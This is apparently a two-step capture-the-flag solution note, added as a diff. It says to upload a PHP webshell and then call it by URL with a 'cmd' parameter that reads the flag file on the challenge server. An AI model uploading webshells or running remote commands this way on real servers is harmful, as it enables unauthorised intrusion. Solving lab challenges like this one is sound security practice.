@@ -1,0 +1,3 @@
+1. Upload a php webshell
+2. http://puzzler7.imaginaryctf.org:4000/pekoshell.php?cmd=cat%20thisisaverylongnamefortheflagfilethatyoullneverguessmuahahaha.txt
+
